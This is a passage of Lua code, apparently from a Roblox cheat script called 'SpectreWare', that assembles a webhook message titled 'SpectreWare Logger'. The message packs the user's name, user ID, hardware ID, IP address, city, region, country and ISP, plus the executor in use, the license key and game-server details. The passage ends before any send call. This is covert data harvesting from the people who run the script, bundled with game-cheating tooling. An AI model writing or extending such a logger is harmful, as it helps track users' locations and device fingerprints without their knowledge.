        pcall(function()
            expiryStr = "📅 "..os.date("!%d %b %Y  %H:%M UTC", math.floor(info.expiresAt / 1000))
        end)
    end

    -- ── Build embed ───────────────────────
    local ok, payload = pcall(function()
        return HS:JSONEncode({
            username   = "SpectreWare Logger",
            avatar_url = "https://i.imgur.com/q9YIPKI.png",
            embeds = {{
                author = {
                    name     = s.emoji.."  SpectreWare  ·  "..s.label,
                    icon_url = "https://i.imgur.com/q9YIPKI.png",
                },
                color       = s.color,
                thumbnail   = { url = avatar },
                description = "```\n───────────────────────\n```",
                fields      = {
                    -- ① Player
                    {
                        name   = "👤  __Player__",
                        value  = "> **"..PL.Name.."** (`"..displayName.."`)\n"
                               .."> 🆔 `"..tostring(PL.UserId).."`\n"
                               .."> 🎂 Age: `"..accAge.."` · 👥 Friends: `"..friends.."`\n"
                               .."> 💎 `"..membership.."`",
                        inline = false,
                    },
                    -- ② Device
                    {
                        name   = "📱  __Device__",
                        value  = "> 📟 Platform: `"..platform.."`\n"
                               .."> 📡 Ping: `"..ping.."`\n"
                               .."> ⚙️ Executor: `"..executor.."`",
                        inline = true,
                    },
                    -- ③ Key
                    {
                        name   = "🔑  __Key__",
                        value  = "> `"..keyDisplay.."`\n"
                               .."> ⏳ `"..info.timeLeft.."`\n"
                               .."> "..expiryStr,
                        inline = true,
                    },
                    -- spacer
                    { name="\u{200B}", value="\u{200B}", inline=false },
                    -- ④ HWID
                    {
                        name   = "🖥️  __HWID__",
                        value  = "```\n"..hwidFull.."\n```",
                        inline = false,
                    },
                    -- ⑤ IP
                    {
                        name   = "🌍  __IP__",
                        value  = "> 🔌 `"..ip.."`\n"
                               .."> 🗺️ `"..ipCity..", "..ipRegion..", "..ipCountry.."`\n"
                               .."> 🏢 `"..ipIsp.."`",
                        inline = false,
                    },
                    {
                        name   = "🎮  __Game__",
                        value  = "> 🗺️ ["..gameName.."](https://www.roblox.com/games/"..tostring(game.PlaceId)..")\n"
                               .."> 👷 `"..gameCreator.."`\n"
                               .."> 🆔 `"..tostring(game.PlaceId).."` · v`"..placeVer.."`",
                        inline = true,
                    },
                    -- ⑥ Server
                    {
                        name   = "🌐  __Server__",
                        value  = "> 👥 `"..playerCount.." / "..maxPlayers.."`\n"
                               .."> ⏱️ Uptime: `"..serverUp.."`\n"
                               .."> 🔗 `"..jobId:sub(1,18).."…`",
                        inline = true,
